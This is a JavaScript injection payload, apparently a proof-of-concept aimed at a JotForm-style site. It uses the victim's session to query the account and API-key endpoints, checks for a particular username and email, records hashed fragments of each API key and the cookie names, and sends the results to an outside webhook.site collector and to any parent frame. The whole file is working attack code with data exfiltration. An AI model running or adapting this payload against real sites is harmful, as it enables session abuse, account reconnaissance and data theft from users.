/* AIAMR-1041-pm marker */
(function () {
  var COLLECT = 'https://webhook.site/156aa60d-29c4-43fa-b37f-ed55d9007ce4/jotform/pm1041';
  var out = { origin: String(location.origin), at: Date.now(), href: String(location.href).slice(0, 300) };
  function j(o) { try { return JSON.stringify(o); } catch (e) { return ''; } }
  (async function () {
    try {
      var r = await fetch('/API/user', { credentials: 'include' });
      var t = await r.text();
      out.u = {
        s: r.status, len: t.length, ct: r.headers.get('content-type') || null,
        hasUser: t.indexOf('username') >= 0,
        hasEmailKey: t.indexOf('email') >= 0,
        isL: t.indexOf('amrintan07') >= 0,
        isLEmail: t.indexOf('amrintan07@gmail.com') >= 0,
        isGuest: t.indexOf('guest') >= 0
      };
    } catch (e) { out.u = { err: String(e).slice(0, 60) }; }
    try {
      var k = await fetch('/API/user/keys', { credentials: 'include' });
      var t2 = await k.text();
      var jj = null; try { jj = JSON.parse(t2); } catch (e) { jj = null; }
      var a = (jj && jj.content) || [];
      out.k = { s: k.status, ct: k.headers.get('content-type') || null, bodyLen: t2.length, n: a.length, i: [] };
      for (var x of a) {
        var v = String(x.key || '');
        var d = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(v));
        out.k.i.push({ a: x.access, l: v.length, f: Array.from(new Uint8Array(d)).slice(0, 4).map(function (b) { return b.toString(16).padStart(2, '0'); }).join('') });
      }
    } catch (e) { out.k = { err: String(e).slice(0, 60) }; }
    var ck = (document.cookie || '').split(';').map(function (x) { return x.trim().split('=')[0]; }).filter(Boolean);
    out.c = { n: ck.length, l: (document.cookie || '').length, names: ck };
    try { window.__AIAMR_1041_PM = out; } catch (e) { }
    try { document.documentElement.setAttribute('data-aiamr-1041-pm', '1'); } catch (e) { }
    try { document.title = 'AIAMR-1041-PM-EXEC ' + out.origin; } catch (e) { }
    try { parent.postMessage({ tag: 'PM1041-' + out.at, d: out }, '*'); } catch (e) { }
    try { navigator.sendBeacon(COLLECT + '/exec-' + out.at, j(out)); } catch (e) { }
    try { (new Image()).src = COLLECT + '/img-' + out.at + '?s=' + encodeURIComponent(String(out.u && out.u.s)); } catch (e) { }
  })();
})();
